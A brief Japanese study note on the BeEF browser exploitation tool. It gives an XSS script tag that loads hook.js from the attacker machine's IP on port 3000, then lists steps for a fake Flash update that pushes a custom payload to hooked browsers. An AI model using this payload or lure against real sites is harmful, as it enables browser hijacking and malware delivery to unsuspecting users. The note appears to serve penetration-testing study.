# BeEF

* ブラウザ向けの脆弱性を検証するツール(XSS)
* メニューから`Beef start`を選択
* XSSでBeEFのスクリプトを実行させて制御を奪う
    `<script src=http://攻撃端末のIPアドレス:3000/hook.js></script>`

## XSS 一例

1. online browsersからターゲットを選択
2. Commandsタブ
3. Social Engineeringを選択
4. Fake Flash Updateを選択
5. 自前のwebサーバー起動 Python
6. Imageは適当な画像
7. Custom Payload URLは送りこみたいペイロードを指定
8. Executeをクリック
9. これでwebページの改ざんはできる(hook.jsを埋め込める)
